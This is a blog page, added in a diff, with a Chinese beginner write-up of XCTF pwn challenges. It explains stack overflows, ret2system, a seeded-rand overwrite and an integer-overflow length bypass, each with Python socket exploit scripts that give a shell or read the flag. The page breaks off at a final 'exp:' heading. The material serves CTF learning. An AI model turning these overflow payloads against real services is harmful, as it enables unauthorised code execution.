@@ -1,0 +1,789 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+
+
+  
+
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="m1n9yu3">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="尝试使用 单纯的底层库 挑战 xctf pwn 的入门题目  使用库:  socket threading  getshellida 打开， 发现 直接调用了 system(“&#x2F;bin&#x2F;sh”)   直接反弹了 shell 这里直接抄了一段 python 模拟 nc 的代码 1234567891011121314151617181920212223242526#!&#x2F;usr&#x2F;bin&#x2F;python3">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xctf_pwn_入门">
+<meta property="og:url" content="https://pwner.top/2021/11/07/xctf-pwn-%E5%85%A5%E9%97%A8/index.html">
+<meta property="og:site_name" content="m1n9yu3&#39;blogs">
+<meta property="og:description" content="尝试使用 单纯的底层库 挑战 xctf pwn 的入门题目  使用库:  socket threading  getshellida 打开， 发现 直接调用了 system(“&#x2F;bin&#x2F;sh”)   直接反弹了 shell 这里直接抄了一段 python 模拟 nc 的代码 1234567891011121314151617181920212223242526#!&#x2F;usr&#x2F;bin&#x2F;python3">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111031538454.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111031541201.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111031544706.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111031545663.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111031547113.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111031549112.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111031554072.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111031714525.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111031717935.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111031725217.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111031957118.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111031959498.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111032001555.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111032003603.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111032025416.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111032026085.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111032035230.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111032036003.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111032038797.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111032042447.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111032105805.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111032107008.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111032109070.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111032111627.png">
+<meta property="article:published_time" content="2021-11-07T10:03:38.000Z">
+<meta property="article:modified_time" content="2021-11-07T10:12:58.000Z">
+<meta property="article:author" content="m1n9yu3">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="栈溢出">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111031538454.png">
+  
+  
+  
+  <title>xctf_pwn_入门 - m1n9yu3&#39;blogs</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"pwner.top","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="m1n9yu3'blogs" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>m1n9yu3&#39;s blogs</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/jiajiao.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="xctf_pwn_入门"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2021-11-07 18:03" pubdate>
+          2021年11月7日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          13 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">xctf_pwn_入门</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <blockquote>
+<p>尝试使用 单纯的底层库 挑战 xctf pwn 的入门题目</p>
+</blockquote>
+<p>使用库:</p>
+<ol>
+<li>socket</li>
+<li>threading</li>
+</ol>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>ida 打开， 发现 直接调用了 system(“/bin/sh”)   直接反弹了 shell</p>
+<p>这里直接抄了一段 python 模拟 nc 的代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-comment"># coding = utf-8</span><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><br>sock = socket.socket()<br><br>sock.connect((<span class="hljs-string">&quot;111.200.241.244&quot;</span>, <span class="hljs-number">65467</span>))<br><span class="hljs-comment"># sock.connect((&quot;192.168.120.50&quot;, 8080))</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">recv</span>():</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        data = sock.recv(<span class="hljs-number">1024</span>).decode()<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Received:&quot;</span>+data)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">send</span>():</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-number">1</span>)<br>        sock.send(<span class="hljs-built_in">input</span>().encode() + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br>Thread(target=recv).start()<br>Thread(target=send).start()<br><br></code></pre></td></tr></table></figure>
+
+
+
+<p>这里需要注意的细节:</p>
+<blockquote>
+<p> send 发送数据时  必须以 \n 结尾， 因为服务端是以\n 判断是否结尾的， python的input 默认把 \n 吃掉了，导致服务器认为你没有发完数据，一直阻塞等待你发送数据，下面也一起阻塞了</p>
+</blockquote>
+<p>直接  ls     cat flag  拿到 flag</p>
+<h2 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h2><p><img src="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111031538454.png" srcset="/img/loading.gif" lazyload alt="image-20211103153827319"></p>
+<p>代码读取了  0x10 字节的数据到 601068 中， 并判断 60106c 是否为 nuaa 字符串， 是就执行一个函数  cat flag</p>
+<p><img src="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111031541201.png" srcset="/img/loading.gif" lazyload alt="image-20211103154100154"></p>
+<p>这里考虑到字符串 大小端   我们构造的 payload 应为  1111aaun           没错就是 nuaa 倒过来</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-comment"># coding = utf-8</span><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> threading<br><br><br>s = socket.socket()<br>s.connect((<span class="hljs-string">&quot;111.200.241.244&quot;</span>, <span class="hljs-number">61055</span>))<br>buffer = s.recv(<span class="hljs-number">4096</span>)<br><br><span class="hljs-built_in">print</span>(buffer)<br>s.send(<span class="hljs-string">b&#x27;1111aaun\n&#x27;</span>)<br><span class="hljs-comment">#</span><br>buffer = s.recv(<span class="hljs-number">1024</span>)<br><br><span class="hljs-built_in">print</span>(buffer)<br><br><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h2><p>普通栈溢出</p>
+<p><img src="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111031544706.png" srcset="/img/loading.gif" lazyload alt="image-20211103154416663"></p>
+<p>main函数 在 stdin(终端) 中打印 Hello World 后执行  vulnerable_function 函数</p>
+<p><img src="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111031545663.png" srcset="/img/loading.gif" lazyload alt="image-20211103154516602"></p>
+<p>vulnerable_function  向 局部变量 buf 中读取字符串 ， 这里发现 buf 的大小为 128 , read 函数却能读取 512 字节数据， 说明这里存在 栈溢出漏洞</p>
+<p>通过观察 vulnerable_function 的栈帧结构</p>
+<p><img src="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111031547113.png" srcset="/img/loading.gif" lazyload alt="image-20211103154712062"></p>
+<p>构造 128 个垃圾字节填充 buf 空间 ， 然后 再构造 8 个垃圾字节填充 s 位置， 最后将 想劫持 eip 的地址 填充到 r 中， exp 构造完成</p>
+<p>我们发现 callsystem 刚好拥有 system(“/bin/sh”) 直接将 eip 改变到此处即可</p>
+<p><img src="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111031549112.png" srcset="/img/loading.gif" lazyload alt="image-20211103154959044"></p>
+<p>改变 eip 的地址为  000000000040059A  </p>
+<p>这里需要将 这个地址填充到上面的 exp中 ， 考虑到 字节序  应将该地址进行转换</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-number">0x000000000040059A</span>.to_bytes(<span class="hljs-number">8</span>, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>, signed=<span class="hljs-literal">True</span>))<br></code></pre></td></tr></table></figure>
+
+<p>得到: b’\x9a\x05@\x00\x00\x00\x00\x00’  </p>
+<p>这里 32 位为 4, 64 位为 8</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-comment"># coding = utf-8</span><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> threading<br><br>s = socket.socket()<br><br>s.connect((<span class="hljs-string">&quot;111.200.241.244&quot;</span>, <span class="hljs-number">62414</span>))<br><br>buffer = s.recv(<span class="hljs-number">4096</span>)<br><span class="hljs-built_in">print</span>(buffer)<br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">128</span> + <span class="hljs-string">b&#x27;1&#x27;</span> * <span class="hljs-number">8</span> + <span class="hljs-string">b&#x27;\x96\x05\x40\x00\x00\x00\x00\x00&#x27;</span> + <span class="hljs-string">b&#x27;\n&#x27;</span><br><br>s.send(payload)<br><br><span class="hljs-comment"># s.send(b&#x27;ls\n&#x27;)</span><br>s.send(<span class="hljs-string">b&#x27;cat flag\n&#x27;</span>)<br><br>buffer = s.recv(<span class="hljs-number">4096</span>)<br><span class="hljs-built_in">print</span>(buffer)<br><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111031554072.png" srcset="/img/loading.gif" lazyload alt="image-20211103155440034"></p>
+<h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>这里稍微复杂一点</p>
+<p>main函数调用了 vulnerable_function 漏洞点也在 此处</p>
+<p><img src="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111031714525.png" srcset="/img/loading.gif" lazyload alt="image-20211103171455461"></p>
+<p>我们发现 read 函数读取了 0x100 个字节 而函数开辟的栈空间才 0x88 字节， 这里栈溢出了</p>
+<p>我们发现，程序里面没有直接调用 system(“/bin/sh”)  但是 system 函数 和 /bin/sh 字符串 都存在</p>
+<p><img src="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111031717935.png" srcset="/img/loading.gif" lazyload alt="image-20211103171702879"></p>
+<p>我们可以通过 read + buf 将堆栈填满， 然后覆盖返回地址  劫持eip 到 system 调用，再把 /bin/sh 的地址填上</p>
+<p>然后选定好 返回地址  0x0804845C  </p>
+<p><img src="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111031725217.png" srcset="/img/loading.gif" lazyload alt="image-20211103172529178"></p>
+<p>当 程序通过溢出 执行到 0x0804845C  时， 我们的堆栈情况为</p>
+<p>esp-4  -&gt;    0x0804845C       </p>
+<p>esp   -&gt;    0804A024   &amp;”/bin/sh”</p>
+<p>我们的 system 函数直接调用了  esp 指向的 字符串  getshell</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-comment"># coding = utf-8</span><br><br><span class="hljs-keyword">import</span> socket<br><br>s = socket.socket()<br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">136</span> + <span class="hljs-number">4</span>) + <span class="hljs-number">0x804845c</span>.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;little&quot;</span>) + <span class="hljs-number">0x0804A024</span>.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;little&quot;</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span><br>s.connect((<span class="hljs-string">&quot;111.200.241.244&quot;</span>, <span class="hljs-number">56744</span>))<br><br>buffer = s.recv(<span class="hljs-number">4096</span>)<br><span class="hljs-built_in">print</span>(buffer)<br><br>s.send(payload)<br><br>s.send(<span class="hljs-string">b&#x27;cat flag\n&#x27;</span>)<br><br><br>buffer = s.recv(<span class="hljs-number">4096</span>)<br><span class="hljs-built_in">print</span>(buffer)<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h2><p>查看代码 </p>
+<p><img src="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111031957118.png" srcset="/img/loading.gif" lazyload alt="image-20211103195707037"></p>
+<p>是一个 猜数字的游戏，但是游戏的数字都是随机产生的</p>
+<p>溢出点在 get  函数， 该函数没有限制输入长度， 会产生溢出， 可覆写 v7 变量以下的所有变量值</p>
+<p><img src="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111031959498.png" srcset="/img/loading.gif" lazyload alt="image-20211103195950449"></p>
+<p>通过观察堆栈，发现随机数种子 seek 在 v7 变量 ，也就是 var_30 下面，所以我们可以通过溢出漏洞， 覆写 seek ， 使随机数可控， 从而  执行最下面的 sub_C3E() 函数 ， getflag</p>
+<p><img src="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111032001555.png" srcset="/img/loading.gif" lazyload alt="image-20211103200125511"></p>
+<p>通过一小段代码，在linux系统上获取指定随机数种子 1 的随机数列表</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br>libc = cdll.LoadLibrary(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>libc.srand(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    <span class="hljs-built_in">print</span>(libc.rand(), end=<span class="hljs-string">&quot;,&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+
+
+<p>拿到之后 ， 开始编写 exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><br>rand_num = [<span class="hljs-number">1804289383</span>,<span class="hljs-number">846930886</span>,<span class="hljs-number">1681692777</span>,<span class="hljs-number">1714636915</span>,<span class="hljs-number">1957747793</span>,<span class="hljs-number">424238335</span>,<span class="hljs-number">719885386</span>,<span class="hljs-number">1649760492</span>,<span class="hljs-number">596516649</span>,<span class="hljs-number">1189641421</span>]<br><br>s = socket.socket()<br>s.connect((<span class="hljs-string">&quot;111.200.241.244&quot;</span>, <span class="hljs-number">60226</span>))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_recv</span>(<span class="hljs-params">s</span>):</span><br>    buffer = s.recv(<span class="hljs-number">4096</span>)<br>    <span class="hljs-built_in">print</span>(buffer)<br><br>get_recv(s)<br>get_recv(s)<br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">32</span> + <span class="hljs-number">0x1</span>.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;little&quot;</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span><br>s.send(payload)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(rand_num)):<br>    get_recv(s)<br>    s.send(<span class="hljs-built_in">str</span>(rand_num[i] % <span class="hljs-number">6</span> + <span class="hljs-number">1</span>).encode() + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br>get_recv(s)<br>get_recv(s)<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111032003603.png" srcset="/img/loading.gif" lazyload alt="image-20211103200344531"></p>
+<h2 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h2><p>调用流程为:  main -&gt; login -&gt; check_passwd</p>
+<p>login 函数 读取了两个 字符串  用户名和密码</p>
+<p><img src="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111032025416.png" srcset="/img/loading.gif" lazyload alt="image-20211103202556357"></p>
+<p>check_passwd  通过判断密码长度， 判定是否为有效密码，为有效密码就做一个字符串拷贝操作</p>
+<p><img src="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111032026085.png" srcset="/img/loading.gif" lazyload alt="image-20211103202653042"></p>
+<p>我们可以看到  buf 的最大长度 为 0x199  大于 __int8 的最大容量 0xff ， 构造一段特定长度的字符串， 就可以造成 过大的字符串空间被复制到 check_passwd 函数中， 造成 栈溢出</p>
+<p><img src="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111032035230.png" srcset="/img/loading.gif" lazyload alt="image-20211103203516182"></p>
+<p>通过观察 堆栈</p>
+<p><img src="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111032036003.png" srcset="/img/loading.gif" lazyload alt="image-20211103203658955"></p>
+<p>得到覆写的长度  0x14 + s 的长度 4  + 函数返回地址</p>
+<p>本题中提供了 what_is_this 函数 读取flag， 所以函数返回地址要劫持到此处</p>
+<p><img src="https://raw.githubusercontent.com/m1n9yu3/image_markdown/main/blogimg/202111032038797.png" srcset="/img/loading.gif" lazyload alt="image-20211103203824752"></p>
+<p>剩下的字节长度就为  0xff - 0x14 - 4 - 4 = 227 </p>
+<p>因题目要求长度  大于且不等于 3  所以  227 + 4 = 231</p>
+<p>payload :</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">0x14</span> + <span class="hljs-number">4</span>) + <span class="hljs-number">0x804868B</span>.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;little&quot;</span>) + <span class="hljs-string">b&#x27;B&#x27;</span> * <span class="hljs-number">231</span> + <span class="hljs-string">b&#x27;\n&#x27;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>exp:</p>
